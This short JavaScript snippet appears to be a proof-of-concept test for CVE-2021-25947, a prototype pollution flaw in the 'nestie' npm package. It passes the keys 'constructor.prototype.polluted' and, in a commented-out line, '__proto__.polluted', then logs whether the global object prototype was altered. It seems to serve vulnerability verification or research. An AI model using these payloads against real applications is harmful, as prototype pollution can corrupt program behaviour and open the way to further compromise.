// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25947
// test("prototype pollution in nestie", () => {
  const { nestie } = require("nestie");
  obj = {};

console.log({}.polluted);
nestie({ "constructor.prototype.polluted": "yes" });
  //nestie({ "__proto__.polluted": "yes" });

console.log({}.polluted);
// });
